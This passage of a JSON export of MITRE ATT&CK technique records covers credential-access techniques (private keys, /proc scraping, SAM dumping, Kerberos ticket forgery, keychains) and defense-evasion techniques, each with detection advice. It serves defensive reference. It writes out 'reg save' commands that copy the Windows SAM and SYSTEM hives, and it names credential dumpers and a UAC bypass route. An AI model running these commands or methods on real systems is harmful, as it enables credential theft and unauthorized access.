16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":698,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":705,"name":"T1552.004 - Private Keys","sort_id":0,"external_id":"T1552.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption\/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. <\/p>\n<p>Adversaries may also look in common key directories, such as <code>~\/.ssh<\/code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;<\/code> on Windows. These private keys can be used to authenticate to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a> like SSH or for use in decrypting other collected files such as email.<\/p>\n<p>Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)<\/p>\n<p>Some private keys require a password or passphrase for operation, so an adversary may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\">Input Capture<\/a> for keylogging or attempt to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> the passphrase off-line.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":705,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":705,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":705,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":706,"name":"T1003.007 - Proc Filesystem","sort_id":0,"external_id":"T1003.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may gather credentials from information stored in the Proc filesystem or <code>\/proc<\/code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.<\/p>\n<p>This functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"To obtain the passwords and hashes stored in memory, processes must open a maps file in the \/proc filesystem for the process being analyzed. This file is stored under the path <code>\/proc\/\\*\/maps<\/code>, where the <code>\\*<\/code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":706,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":741,"name":"T1003.002 - Security Account Manager","sort_id":0,"external_id":"T1003.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user<\/code> command. Enumerating the SAM database requires SYSTEM level access.<\/p>\n<p>A number of tools can be used to retrieve the SAM file through in-memory techniques:<\/p>\n<ul>\n<li>pwdumpx.exe<\/li>\n<li><a href=\"https:\/\/attack.mitre.org\/software\/S0008\">gsecdump<\/a><\/li>\n<li><a href=\"https:\/\/attack.mitre.org\/software\/S0002\">Mimikatz<\/a><\/li>\n<li>secretsdump.py<\/li>\n<\/ul>\n<p>Alternatively, the SAM can be extracted from the Registry with Reg:<\/p>\n<ul>\n<li><code>reg save HKLM\\sam sam<\/code><\/li>\n<li><code>reg save HKLM\\system system<\/code><\/li>\n<\/ul>\n<p>Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)<\/p>\n<p>Notes: <\/p>\n<ul>\n<li>RID 500 account is the local, built-in administrator.<\/li>\n<li>RID 501 is the guest account.<\/li>\n<li>User accounts start with a RID of 1,000+.<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%\/system32\/config\/SAM<\/code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) in-use by adversaries may help as well.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":741,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":744,"name":"T1555.002 - Securityd Memory","sort_id":0,"external_id":"T1555.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>An adversary may obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain) (Citation: OSX Keydnap malware)<\/p>\n<p>In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":744,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":744,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":752,"name":"T1558.002 - Silver Ticket","sort_id":0,"external_id":"T1558.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)<\/p>\n<p>Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)<\/p>\n<p>Password hashes for target services may be obtained using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1558\/003\">Kerberoasting<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon\/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":752,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":760,"name":"T1558 - Steal or Forge Kerberos Tickets","sort_id":0,"external_id":"T1558","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/003\">Pass the Ticket<\/a>. <\/p>\n<p>Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon\/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https:\/\/attack.mitre.org\/techniques\/T1550\/003) being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https:\/\/attack.mitre.org\/software\/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":760,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":781,"name":"T1552 - Unsecured Credentials","sort_id":0,"external_id":"T1552","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and\/or misplaced in many locations on a system, including plaintext files (e.g. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1552\/003\">Bash History<\/a>), operating system or application-specific repositories (e.g. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1552\/002\">Credentials in Registry<\/a>), or other specialized files\/artifacts (e.g. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1552\/004\">Private Keys<\/a>).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) for more information.\n\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and\/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated\/scripted credential access behavior.\n\nMonitoring when the user's <code>.bash_history<\/code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~\/.bash_history<\/code>.\n\nAdditionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https:\/\/attack.mitre.org\/software\/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":781,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":800,"name":"T1579 - Keychain","sort_id":0,"external_id":"T1579","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may collect the keychain storage data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials.<\/p>\n<p>On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, an adversary can access the entire encrypted database.(Citation: Apple Keychain Services)(Citation: Elcomsoft Decrypt Keychain)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Mobile security products can potentially detect jailbroken devices and perform further actions as necessary.","platforms":[{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":800,"platform_id":11,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]}]},{"id":19,"name":"Defense Evasion","source_name":"ENTERPRISE_defense-evasion","sort_id":0,"external_id":"TA0005","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":19},"techniques":[{"id":152,"name":"T1134 - Access Token Manipulation","sort_id":0,"external_id":"T1134","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.<\/p>\n<p>An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1134\/001\">Token Impersonation\/Theft<\/a>) or used to spawn a new process (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1134\/002\">Create Process with Token<\/a>). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)<\/p>\n<p>Any standard user can use the <code>runas<\/code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas<\/code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser<\/code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx<\/code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser<\/code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID\/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":152,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":160,"name":"T1527 - Application Access Token","sort_id":0,"external_id":"T1527","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.<\/p>\n<p>Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)<\/p>\n<p>For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a &quot;refresh&quot; token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)<\/p>\n<p>Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":160,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":160,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":168,"name":"T1197 - BITS Jobs","sort_id":0,"external_id":"T1197","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.<\/p>\n<p>The interface to create and manage BITS jobs is accessible through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>  (Citation: Microsoft BITS) and the <a href=\"https:\/\/attack.mitre.org\/software\/S0190\">BITSAdmin<\/a> tool. (Citation: Microsoft BITSAdmin)<\/p>\n<p>Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)<\/p>\n<p>BITS upload functionalities can also be used to perform <a href=\"https:\/\/attack.mitre.org\/techniques\/T1048\">Exfiltration Over Alternative Protocol<\/a>. (Citation: CTU BITS Malware June 2016)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits<\/code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https:\/\/attack.mitre.org\/software\/S0190) tool (<code>bitsadmin \/list \/allusers \/verbose<\/code>). (Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https:\/\/attack.mitre.org\/software\/S0190) tool (especially the \u2018Transfer\u2019, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). (Citation: Microsoft BITS)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":168,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":170,"name":"T1009 - Binary Padding","sort_id":0,"external_id":"T1009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.<\/p>\n<p>Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":170,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":170,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":170,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":175,"name":"T1088 - Bypass User Account Control","sort_id":0,"external_id":"T1088","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)<\/p>\n<p>If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.<\/p>\n<p>Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:<\/p>\n<ul>\n<li><code>eventvwr.exe<\/code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)<\/li>\n<\/ul>\n<p>Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":175,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":176,"name":"T1191 - CMSTP","sort_id":0,"external_id":"T1191","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>The 